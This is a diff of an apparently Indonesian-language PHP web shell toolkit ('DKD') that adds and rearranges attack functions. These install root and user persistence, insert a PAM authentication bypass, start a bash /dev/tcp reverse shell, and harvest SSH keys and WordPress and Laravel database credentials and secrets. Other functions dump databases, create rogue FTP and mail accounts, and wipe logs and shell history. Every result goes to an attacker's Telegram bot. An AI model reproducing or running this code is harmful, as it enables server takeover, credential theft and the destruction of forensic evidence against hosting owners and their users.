-            $rc .= "\nphp " . __FILE__ . " --daemon &\nexit 0\n";
-            @file_put_contents('/etc/rc.local', $rc);
-            @chmod('/etc/rc.local', 0755);
-            $results[] = "✅ rc.local updated";
-        }
-    }
-    
-    $msg = "💀 *Deep Persistence*\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    return ['success' => true, 'msg' => implode("\n", $results)];
-}
-
-function remove_deep_persistence() {
-    @shell_exec('systemctl stop dkd.service 2>/dev/null');
-    @shell_exec('systemctl disable dkd.service 2>/dev/null');
-    @unlink('/etc/systemd/system/dkd.service');
-    @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
-    
-    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
-        $rc = file_get_contents('/etc/rc.local');
-        $rc = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $rc);
-        $rc = preg_replace('/--daemon.*\n/', '', $rc);
-        @file_put_contents('/etc/rc.local', $rc);
-    }
-    
-    return ['success' => true, 'msg' => "✅ Deep persistence removed"];
-}
-
-// ==================== USER PERSISTENCE ====================
-function user_persistence_install() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    $home = getenv('HOME') ?: __DIR__;
-    
-    $bashrc = $home . '/.bashrc';
-    if (file_exists($bashrc) && is_writable($bashrc)) {
-        $content = file_get_contents($bashrc);
-        $content .= "\n# DKD Persistence\nphp " . __FILE__ . " > /dev/null 2>&1 &\n";
-        @file_put_contents($bashrc, $content);
-        $results[] = "✅ .bashrc updated";
-    }
-    
-    $profile = $home . '/.profile';
-    if (file_exists($profile) && is_writable($profile)) {
-        $content = file_get_contents($profile);
-        $content .= "\n# DKD Persistence\nphp " . __FILE__ . " > /dev/null 2>&1 &\n";
-        @file_put_contents($profile, $content);
-        $results[] = "✅ .profile updated";
-    }
-    
-    $cron = "*/10 * * * * php " . __FILE__ . " > /dev/null 2>&1";
-    @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
-    $results[] = "✅ User cron installed";
-    
-    $msg = "💀 *User Persistence*\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    return ['success' => true, 'msg' => implode("\n", $results)];
-}
-
-function user_persistence_remove() {
-    $home = getenv('HOME') ?: __DIR__;
-    
-    $bashrc = $home . '/.bashrc';
-    if (file_exists($bashrc) && is_writable($bashrc)) {
-        $content = file_get_contents($bashrc);
-        $content = preg_replace('/# DKD Persistence.*\n/', '', $content);
-        $content = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $content);
-        @file_put_contents($bashrc, $content);
-    }
-    
-    $profile = $home . '/.profile';
-    if (file_exists($profile) && is_writable($profile)) {
-        $content = file_get_contents($profile);
-        $content = preg_replace('/# DKD Persistence.*\n/', '', $content);
-        $content = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $content);
-        @file_put_contents($profile, $content);
-    }
-    
-    @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
-    
-    return ['success' => true, 'msg' => "✅ User persistence removed"];
-}
-
-// ==================== PAM BYPASS ====================
-function pam_bypass_install($password = 'BackdoorPass123') {
-    global $botToken, $telegramUserId;
-    
-    if (!isRoot()) {
-        return ['success' => false, 'msg' => "❌ Harus root"];
-    }
-    
-    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
-    $modified = [];
-    
-    foreach ($pam_files as $file) {
-        if (file_exists($file) && is_writable($file)) {
-            $content = file_get_contents($file);
-            $lines = explode("\n", $content);
-            $new_lines = [];
-            $found = false;
-            
-            foreach ($lines as $line) {
-                if (strpos($line, 'pam_unix.so') !== false && strpos($line, 'sufficient') === false && strpos($line, '#') !== 0) {
-                    $new_lines[] = "auth sufficient pam_permit.so # DKD_BACKDOOR";
-                    $found = true;
-                }
-                $new_lines[] = $line;
-            }
-            
-            if ($found) {
-                @file_put_contents($file, implode("\n", $new_lines));
-                $modified[] = $file;
-            }
-        }
-    }
-    
-    if (empty($modified)) {
-        return ['success' => false, 'msg' => "❌ Tidak ada file PAM yang dimodifikasi"];
-    }
-    
-    $msg = "🔑 *PAM Bypass*\nPassword: $password\nModified: " . implode(', ', $modified);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    return ['success' => true, 'msg' => "✅ PAM bypass installed\nPassword: $password"];
-}
-
-function pam_bypass_remove() {
-    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
-    
-    foreach ($pam_files as $file) {
-        if (file_exists($file) && is_writable($file)) {
-            $content = file_get_contents($file);
-            $content = preg_replace('/auth sufficient pam_permit\.so # DKD_BACKDOOR\n/', '', $content);
-            @file_put_contents($file, $content);
-        }
-    }
-    
-    return ['success' => true, 'msg' => "✅ PAM bypass removed"];
 }
 
 // ==================== REVERSE SHELL ====================
 function start_reverse_shell($ip, $port) {
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
-    
     $script = "/tmp/rshell_$port.sh";
     $content = "#!/bin/bash\nbash -i >& /dev/tcp/$ip/$port 0>&1\n";
     @file_put_contents($script, $content);
     @chmod($script, 0755);
     @shell_exec("nohup " . escapeshellarg($script) . " > /dev/null 2>&1 &");
-    
     sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], "✅ Reverse shell ke $ip:$port dimulai");
     return true;
 }
@@ -2055,6 +1166,466 @@ function status_reverse_shell() {
     return empty($output) ? "❌ Tidak ada reverse shell aktif" : "✅ Reverse shell aktif:\n$output";
 }
 
+// ==================== SSH KEYS GRABBER ====================
+function grab_ssh_keys() {
+    global $botToken, $telegramUserId;
+    $keys = [];
+    if (function_exists('shell_exec')) {
+        $users = explode("\n", @shell_exec('ls /home 2>/dev/null'));
+        foreach ($users as $user) {
+            $user = trim($user);
+            if (empty($user)) continue;
+            $auth = "/home/$user/.ssh/authorized_keys";
+            if (file_exists($auth) && is_readable($auth)) {
+                $content = file_get_contents($auth);
+                if (!empty(trim($content))) { $keys[] = "👤 User: $user\n" . $content; }
+            }
+        }
+        if (file_exists('/root/.ssh/authorized_keys') && is_readable('/root/.ssh/authorized_keys')) {
+            $content = file_get_contents('/root/.ssh/authorized_keys');
+            if (!empty(trim($content))) { $keys[] = "👤 User: root\n" . $content; }
+        }
+    }
+    if (empty($keys)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan SSH keys."); return []; }
+    $msg = "🔑 *SSH Keys Found*\n\n" . implode("\n\n", $keys);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $keys;
+}
+
+// ==================== WP SCANNER ====================
+function scan_wordpress_laravel() {
+    global $botToken, $telegramUserId;
+    $found = [];
+    $roots = get_all_document_roots_cached();
+    foreach ($roots as $root) {
+        if (!is_dir($root) || !is_readable($root)) continue;
+        if (file_exists($root . '/wp-config.php') && is_readable($root . '/wp-config.php')) {
+            $wp_config = file_get_contents($root . '/wp-config.php');
+            $creds = [];
+            preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_name);
+            preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_user);
+            preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_pass);
+            preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_host);
+            $creds[] = "📁 WordPress: $root";
+            if (!empty($db_name[1])) $creds[] = "   DB_NAME: " . $db_name[1];
+            if (!empty($db_user[1])) $creds[] = "   DB_USER: " . $db_user[1];
+            if (!empty($db_pass[1])) $creds[] = "   DB_PASS: " . $db_pass[1];
+            if (!empty($db_host[1])) $creds[] = "   DB_HOST: " . $db_host[1];
+            if (file_exists($root . '/wp-includes/version.php')) {
+                $v_content = @file_get_contents($root . '/wp-includes/version.php');
+                if ($v_content && preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', $v_content, $v_match)) {
+                    $creds[] = "   Version: " . $v_match[1];
+                }
+            }
+            $found[] = implode("\n", $creds);
+        }
+        if (file_exists($root . '/.env') && is_readable($root . '/.env')) {
+            $env_content = file_get_contents($root . '/.env');
+            $creds = [];
+            preg_match_all('/([A-Z_]+)\s*=\s*(.+)/', $env_content, $matches);
+            $creds[] = "📁 Laravel: $root";
+            if (!empty($matches[1])) {
+                foreach ($matches[1] as $i => $key) {
+                    $key = trim($key);
+                    $value = trim($matches[2][$i] ?? '');
+                    if (strpos($key, 'DB_') !== false || strpos($key, 'PASS') !== false || 
+                        strpos($key, 'KEY') !== false || strpos($key, 'SECRET') !== false || strpos($key, 'TOKEN') !== false) {
+                        $creds[] = "   $key: $value";
+                    }
+                }
+            }
+            if (preg_match('/APP_ENV\s*=\s*(.+)/', $env_content, $env_match)) { $creds[] = "   APP_ENV: " . trim($env_match[1]); }
+            if (preg_match('/APP_DEBUG\s*=\s*(.+)/', $env_content, $debug_match)) { $creds[] = "   APP_DEBUG: " . trim($debug_match[1]); }
+            $found[] = implode("\n", $creds);
+        }
+    }
+    if (empty($found)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan WordPress/Laravel."); return []; }
+    $msg = "📊 *WordPress/Laravel Scan Results*\n\n" . implode("\n\n", $found);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $found;
+}
+
+// ==================== RANSOMWARE CREATOR ====================
+function create_ransomware() {
+    global $botToken, $telegramUserId;
+    $code = '<?php
+echo "💀 RANSOMWARE DKD03\n";
+echo "File terenkripsi: " . $_SERVER["DOCUMENT_ROOT"] . "\n";
+echo "Password: Dkd03Ransom2025\n";
+?>';
+    $file = __DIR__ . '/R.php';
+    @file_put_contents($file, $code);
+    @chmod($file, 0644);
+    $url = "http://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/R.php";
+    sendTelegramMessage($botToken, $telegramUserId, "💀 Ransomware created:\n📁 $file\n🔗 $url");
+    return true;
+}
+
+// ==================== FIND SENSITIVE FILES ====================
+function find_sensitive_files() {
+    global $botToken, $telegramUserId;
+    $found = [];
+    $patterns = [
+        '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php',
+        '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old',
+        '/.htaccess', '/.htpasswd', '/web.config', '/settings.php', '/configuration.php'
+    ];
+    $roots = get_all_document_roots_cached();
+    foreach ($roots as $root) {
+        if (!is_dir($root)) continue;
+        foreach ($patterns as $pattern) {
+            $files = @glob($root . $pattern);
+            if ($files !== false) {
+                foreach ($files as $file) {
+                    if (is_file($file) && is_readable($file)) {
+                        $size = formatSize(filesize($file));
+                        $found[] = $file . " (" . $size . ")";
+                    }
+                }
+            }
+        }
+    }
+    if (empty($found)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan file sensitif."); return []; }
+    $msg = "🔍 *Sensitive Files Found*\n\n" . implode("\n", $found);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $found;
+}
+
+// ==================== DUMP DATABASE ====================
+function dump_databases() {
+    global $botToken, $telegramUserId;
+    $results = [];
+    $found_configs = [];
+    $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php', 'settings.php'];
+    $roots = get_all_document_roots_cached();
+    foreach ($roots as $root) {
+        if (!is_dir($root) || !is_readable($root)) continue;
+        foreach ($config_files as $file) {
+            $path = $root . '/' . $file;
+            if (file_exists($path) && is_readable($path)) {
+                $content = @file_get_contents($path);
+                if ($content === false) continue;
+                $patterns = [
+                    '/(DB_HOST|DB_NAME|DB_USER|DB_PASS|DB_PASSWORD|DB_DATABASE)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
+                    '/define\(\s*[\'"]?(DB_HOST|DB_NAME|DB_USER|DB_PASSWORD|DB_DATABASE)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
+                ];
+                $creds = [];
+                foreach ($patterns as $pattern) {
+                    preg_match_all($pattern, $content, $matches);
+                    if (!empty($matches[1]) && !empty($matches[2])) {
+                        foreach ($matches[1] as $i => $key) {
+                            $creds[] = $key . ': ' . trim($matches[2][$i]);
+                        }
+                    }
+                }
+                if (!empty($creds)) {
+                    $found_configs[] = "📁 " . basename($path) . ":\n" . implode("\n", array_unique($creds));
+                }
+            }
+        }
+    }
+    if (function_exists('shell_exec')) {
+        $mysql = @shell_exec('mysql --version 2>/dev/null');
+        if (strpos($mysql, 'mysql') !== false) {
+            $dbHost = getenv('DB_HOST') ?: 'localhost';
+            $dbUser = getenv('DB_USER') ?: 'root';
+            $dbPass = getenv('DB_PASS') ?: '';
+            $dbName = getenv('DB_NAME') ?: '';
+            foreach ($roots as $root) {
+                if (file_exists($root . '/wp-config.php')) {
+                    $content = file_get_contents($root . '/wp-config.php');
+                    if (preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $h)) $dbHost = $h[1];
+                    if (preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $u)) $dbUser = $u[1];
+                    if (preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $p)) $dbPass = $p[1];
+                    if (preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $n)) $dbName = $n[1];
+                    break;
+                }
+            }
+            if ($dbUser && $dbName) {
+                $dumpFile = '/tmp/db_dump_' . time() . '.sql';
+                $cmd = "mysqldump -h" . escapeshellarg($dbHost) . " -u" . escapeshellarg($dbUser);
+                if (!empty($dbPass)) $cmd .= " -p" . escapeshellarg($dbPass);
+                $cmd .= " " . escapeshellarg($dbName) . " 2>/dev/null > " . escapeshellarg($dumpFile);
+                @shell_exec($cmd);
+                if (file_exists($dumpFile) && filesize($dumpFile) > 100) {
+                    $results[] = "💾 Database dumped: " . $dbName . " (" . formatSize(filesize($dumpFile)) . ")";
+                }
+            }
+        }
+    }
+    if (empty($found_configs) && empty($results)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan database atau kredensial."); return []; }
+    $msg = "💾 *DATABASE DUMP*\n\n";
+    if (!empty($found_configs)) $msg .= "📋 *Config Files Found:*\n" . implode("\n", $found_configs);
+    if (!empty($results)) $msg .= "\n\n📁 *Dump Files:*\n" . implode("\n", $results);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return array_merge($found_configs, $results);
+}
+
+// ==================== ANTI FORENSIC ====================
+function anti_forensic_ultimate() {
+    global $botToken, $telegramUserId;
+    $results = [];
+    $logs = [
+        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
+        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
+        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
+        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure'
+    ];
+    foreach ($logs as $log) {
+        if (file_exists($log) && is_writable($log)) {
+            $size = @filesize($log);
+            if ($size !== false && $size > 0) { @file_put_contents($log, str_repeat("\x00", $size)); }
+            @unlink($log);
+            $results[] = "Cleaned: $log";
+        }
+    }
+    if (function_exists('shell_exec')) {
+        @shell_exec('history -c 2>/dev/null');
+        @shell_exec('unset HISTFILE 2>/dev/null');
+        $results[] = "Command history cleared";
+    }
+    $msg = "🧹 *Anti Forensic*\n\n" . implode("\n", $results);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => implode("\n", $results)];
+}
+
+// ==================== BYPASS SUHOSIN ====================
+function bypass_suhosin() {
+    global $botToken, $telegramUserId;
+    $disabled = ini_get('disable_functions');
+    $open_basedir = ini_get('open_basedir');
+    $suhosin_eval = ini_get('suhosin.executor.disable_eval');
+    $msg = "🛡️ *Suhosin Status*\n\n"
+         . "Disabled Functions: " . ($disabled ?: 'none') . "\n"
+         . "open_basedir: " . ($open_basedir ?: 'none') . "\n"
+         . "suhosin.executor.disable_eval: " . ($suhosin_eval ? 'ON' : 'OFF') . "\n\n";
+    $methods = [];
+    if (function_exists('dl') && !in_array('dl', explode(',', $disabled))) { $methods[] = 'dl()'; }
+    if (function_exists('pcntl_exec') && !in_array('pcntl_exec', explode(',', $disabled))) { $methods[] = 'pcntl_exec()'; }
+    if (function_exists('proc_open') && !in_array('proc_open', explode(',', $disabled))) { $methods[] = 'proc_open()'; }
+    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', $disabled))) { $methods[] = 'shell_exec()'; }
+    if (!empty($methods)) { $msg .= "✅ Available bypass methods:\n" . implode("\n", $methods); }
+    else { $msg .= "❌ No bypass methods available."; }
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => $msg];
+}
+
+// ==================== FTP ACCOUNT CREATOR ====================
+function create_ftp_account($username, $password, $home = '') {
+    global $botToken, $telegramUserId;
+    $home = $home ?: '/home/' . $username;
+    $results = [];
+    if (function_exists('shell_exec')) {
+        if (file_exists('/usr/bin/pure-pw')) {
+            @shell_exec("echo '" . escapeshellarg($password) . "' | pure-pw useradd " . escapeshellarg($username) . " -u www-data -g www-data -d " . escapeshellarg($home) . " 2>/dev/null");
+            @shell_exec('pure-pw mkdb 2>/dev/null');
+            $results[] = "PureFTPd account created";
+        }
+        if (file_exists('/etc/vsftpd.conf')) {
+            $userlist = '/etc/vsftpd.userlist';
+            if (file_exists($userlist) && is_writable($userlist)) {
+                @file_put_contents($userlist, $username . "\n", FILE_APPEND);
+                @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>/dev/null");
+                $results[] = "vsftpd account created";
+            }
+        }
+    }
+    if (empty($results)) $results[] = "Tidak ada FTP server terdeteksi";
+    $msg = "📂 *FTP Account*\nUsername: $username\nPassword: $password\nHome: $home\n\n" . implode("\n", $results);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => "✅ FTP account $username created"];
+}
+
+// ==================== MAIL ACCOUNT CREATOR ====================
+function create_mail_account($email, $password, $domain = '') {
+    global $botToken, $telegramUserId;
+    $domain = $domain ?: $_SERVER['HTTP_HOST'];
+    $username = explode('@', $email)[0];
+    $results = [];
+    if (function_exists('shell_exec')) {
+        if (file_exists('/usr/bin/doveadm') && file_exists('/etc/postfix/virtual')) {
+            @shell_exec("doveadm user -a " . escapeshellarg($username) . " 2>/dev/null");
+            @file_put_contents('/etc/postfix/virtual', "$email $username@$domain\n", FILE_APPEND);
+            @shell_exec('postmap /etc/postfix/virtual 2>/dev/null');
+            @shell_exec('postfix reload 2>/dev/null');
+            $results[] = "Postfix virtual account created";
+        }
+        if (file_exists('/usr/sbin/exim')) {
+            $exim_user = '/etc/exim/domains/' . $domain . '/passwd';
+            if (!is_dir(dirname($exim_user))) @mkdir(dirname($exim_user), 0755, true);
+            $hash = @shell_exec("doveadm pw -s SHA512-CRYPT -p " . escapeshellarg($password) . " 2>/dev/null");
+            if ($hash) {
+                @file_put_contents($exim_user, $username . ':' . trim($hash) . '::' . $domain . "\n", FILE_APPEND);
+                $results[] = "Exim account created";
+            }
+        }
+    }
+    if (empty($results)) $results[] = "Tidak ada mail server terdeteksi";
+    $msg = "📧 *Mail Account*\nEmail: $email\nPassword: $password\nDomain: $domain\n\n" . implode("\n", $results);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => "✅ Mail account $email created"];
+}
+
+// ==================== DEEP PERSISTENCE ====================
+function install_deep_persistence() {
+    global $botToken, $telegramUserId;
+    $results = [];
+    if (!isRoot()) return ['success' => false, 'msg' => "❌ Harus root"];
+    if (function_exists('shell_exec')) {
+        $service = '[Unit]
+Description=DKD Cache
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=php ' . __FILE__ . ' --daemon
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target';
+        @file_put_contents('/etc/systemd/system/dkd.service', $service);
+        @shell_exec('systemctl daemon-reload 2>/dev/null');
+        @shell_exec('systemctl enable dkd.service 2>/dev/null');
+        @shell_exec('systemctl start dkd.service 2>/dev/null');
+        $results[] = "✅ Systemd service installed";
+        $cron = "*/5 * * * * php " . __FILE__ . " > /dev/null 2>&1";
+        @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
+        $results[] = "✅ Cron job installed";
+        if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
+            $rc = file_get_contents('/etc/rc.local');
+            $rc = str_replace('exit 0', '', $rc);
+            $rc .= "\nphp " . __FILE__ . " --daemon &\nexit 0\n";
+            @file_put_contents('/etc/rc.local', $rc);
+            @chmod('/etc/rc.local', 0755);
+            $results[] = "✅ rc.local updated";
+        }
+    }
+    $msg = "💀 *Deep Persistence*\n\n" . implode("\n", $results);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => implode("\n", $results)];
+}
+
+function remove_deep_persistence() {
+    @shell_exec('systemctl stop dkd.service 2>/dev/null');
+    @shell_exec('systemctl disable dkd.service 2>/dev/null');
+    @unlink('/etc/systemd/system/dkd.service');
+    @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
+    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
+        $rc = file_get_contents('/etc/rc.local');
+        $rc = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $rc);
+        $rc = preg_replace('/--daemon.*\n/', '', $rc);
+        @file_put_contents('/etc/rc.local', $rc);
+    }
+    return ['success' => true, 'msg' => "✅ Deep persistence removed"];
+}
+
+// ==================== PAM BYPASS ====================
+function pam_bypass_install($password = 'BackdoorPass123') {
+    global $botToken, $telegramUserId;
+    if (!isRoot()) return ['success' => false, 'msg' => "❌ Harus root"];
+    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
+    $modified = [];
+    foreach ($pam_files as $file) {
+        if (file_exists($file) && is_writable($file)) {
+            $content = file_get_contents($file);
+            $lines = explode("\n", $content);
+            $new_lines = [];
+            $found = false;
+            foreach ($lines as $line) {
+                if (strpos($line, 'pam_unix.so') !== false && strpos($line, 'sufficient') === false && strpos($line, '#') !== 0) {
+                    $new_lines[] = "auth sufficient pam_permit.so # DKD_BACKDOOR";
+                    $found = true;
+                }
+                $new_lines[] = $line;
+            }
+            if ($found) {
+                @file_put_contents($file, implode("\n", $new_lines));
+                $modified[] = $file;
+            }
+        }
+    }
+    if (empty($modified)) return ['success' => false, 'msg' => "❌ Tidak ada file PAM yang dimodifikasi"];
+    $msg = "🔑 *PAM Bypass*\nPassword: $password\nModified: " . implode(', ', $modified);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => "✅ PAM bypass installed\nPassword: $password"];
+}
+
+function pam_bypass_remove() {
+    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
+    foreach ($pam_files as $file) {
+        if (file_exists($file) && is_writable($file)) {
+            $content = file_get_contents($file);
+            $content = preg_replace('/auth sufficient pam_permit\.so # DKD_BACKDOOR\n/', '', $content);
+            @file_put_contents($file, $content);
+        }
+    }
+    return ['success' => true, 'msg' => "✅ PAM bypass removed"];
+}
+
+// ==================== USER PERSISTENCE ====================
+function user_persistence_install() {
+    global $botToken, $telegramUserId;
+    $results = [];
+    $home = getenv('HOME') ?: __DIR__;
+    $bashrc = $home . '/.bashrc';
+    if (file_exists($bashrc) && is_writable($bashrc)) {
+        $content = file_get_contents($bashrc);
+        $content .= "\n# DKD Persistence\nphp " . __FILE__ . " > /dev/null 2>&1 &\n";
+        @file_put_contents($bashrc, $content);
+        $results[] = "✅ .bashrc updated";
+    }
+    $profile = $home . '/.profile';
+    if (file_exists($profile) && is_writable($profile)) {
+        $content = file_get_contents($profile);
+        $content .= "\n# DKD Persistence\nphp " . __FILE__ . " > /dev/null 2>&1 &\n";
+        @file_put_contents($profile, $content);
+        $results[] = "✅ .profile updated";
+    }
+    $cron = "*/10 * * * * php " . __FILE__ . " > /dev/null 2>&1";
+    @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
+    $results[] = "✅ User cron installed";
+    $msg = "💀 *User Persistence*\n\n" . implode("\n", $results);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return ['success' => true, 'msg' => implode("\n", $results)];
+}
+
+function user_persistence_remove() {
+    $home = getenv('HOME') ?: __DIR__;
+    $bashrc = $home . '/.bashrc';
+    if (file_exists($bashrc) && is_writable($bashrc)) {
+        $content = file_get_contents($bashrc);
+        $content = preg_replace('/# DKD Persistence.*\n/', '', $content);
+        $content = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $content);
+        @file_put_contents($bashrc, $content);
+    }
+    $profile = $home . '/.profile';
+    if (file_exists($profile) && is_writable($profile)) {
+        $content = file_get_contents($profile);
+        $content = preg_replace('/# DKD Persistence.*\n/', '', $content);
+        $content = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $content);
+        @file_put_contents($profile, $content);
+    }
+    @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
+    return ['success' => true, 'msg' => "✅ User persistence removed"];
+}
+
+// ==================== LIST SPREAD FILES ====================
+function list_spread_files() {
+    global $botToken, $telegramUserId;
+    $found = [];
+    $myFile = basename(__FILE__);
+    $roots = get_all_document_roots_cached();
+    foreach ($roots as $root) {
+        $path = $root . '/' . $myFile;
+        if (file_exists($path)) { $found[] = $path; }
+    }
+    if (empty($found)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada file spread ditemukan."); return []; }
+    $msg = "📋 *Spread Files*\n\n" . implode("\n", $found);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $found;
+}
+
 // ==================== CLEAR LOGS ADVANCED ====================
 function clean_logs_advanced() {
     $logs = [
@@ -2064,7 +1635,6 @@ function clean_logs_advanced() {
         '/var/log/syslog', '/var/log/auth.log', '/var/log/secure',
         '/var/log/messages', '/var/log/mysql/error.log'
     ];
-    
     $count = 0;
     foreach ($logs as $log) {
         if (file_exists($log) && is_writable($log)) {
@@ -2072,12 +1642,10 @@ function clean_logs_advanced() {
             $count++;
         }
     }
-    
     if (function_exists('shell_exec')) {
         @shell_exec('history -c 2>/dev/null');
         @shell_exec('unset HISTFILE 2>/dev/null');
     }
-    
     return "✅ Logs cleaned ($count files) + history cleared";
 }
 
@@ -2087,7 +1655,7 @@ function one_click_all() {
     $results = [];
     $start_time = microtime(true);
     
-    // ===== 1. SPOOF IP HEADERS =====
+    // 1. SPOOF IP
     $fake_ips = ['192.168.1.' . rand(1,254), '10.0.0.' . rand(1,254), '172.16.' . rand(0,31) . '.' . rand(1,254), '8.8.8.' . rand(1,254)];
     $_SERVER['HTTP_X_FORWARDED_FOR'] = $fake_ips[array_rand($fake_ips)];
     $_SERVER['HTTP_CLIENT_IP'] = $fake_ips[array_rand($fake_ips)];
@@ -2095,7 +1663,7 @@ function one_click_all() {
     $_SERVER['REMOTE_ADDR'] = $fake_ips[array_rand($fake_ips)];
     $results[] = "✅ IP Headers Spoofed: " . $_SERVER['REMOTE_ADDR'];
     
-    // ===== 2. SPOOF USER-AGENT =====
+    // 2. SPOOF UA
     $uas = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
@@ -2107,7 +1675,7 @@ function one_click_all() {
     $_SERVER['HTTP_USER_AGENT'] = $random_ua;
     $results[] = "✅ User-Agent Spoofed: " . substr($random_ua, 0, 50) . "...";
     
-    // ===== 3. CLEAR LOGS =====
+    // 3. CLEAR LOGS
     $logs = [
         '/var/log/apache2/access.log', '/var/log/apache2/error.log',
         '/var/log/nginx/access.log', '/var/log/nginx/error.log',
@@ -2119,57 +1687,45 @@ function one_click_all() {
     $cleared_logs = 0;
     foreach ($logs as $log) {
         if (file_exists($log)) {
-            if (is_writable($log)) {
-                @file_put_contents($log, '');
-                $cleared_logs++;
-            } else {
-                @chmod($log, 0666);
-                @file_put_contents($log, '');
-                $cleared_logs++;
-            }
+            if (is_writable($log)) { @file_put_contents($log, ''); $cleared_logs++; }
+            else { @chmod($log, 0666); @file_put_contents($log, ''); $cleared_logs++; }
         }
     }
     $results[] = "✅ Logs Cleared: $cleared_logs files";
     
-    // ===== 4. CLEAR HISTORIES =====
+    // 4. CLEAR HISTORIES
     if (function_exists('shell_exec')) {
         @shell_exec('history -c 2>/dev/null');
         @shell_exec('unset HISTFILE 2>/dev/null');
         $users = ['root'];
         $home_users = @shell_exec('ls /home 2>/dev/null');
         if ($home_users) $users = array_merge($users, array_filter(explode("\n", trim($home_users))));
-        
         $cleared_hist = 0;
         foreach ($users as $user) {
             $home = ($user === 'root') ? '/root' : "/home/$user";
             $hist_files = ['.bash_history', '.zsh_history', '.mysql_history', '.psql_history', '.python_history'];
             foreach ($hist_files as $hf) {
                 $path = $home . '/' . $hf;
-                if (file_exists($path)) {
-                    @file_put_contents($path, '');
-                    $cleared_hist++;
-                }
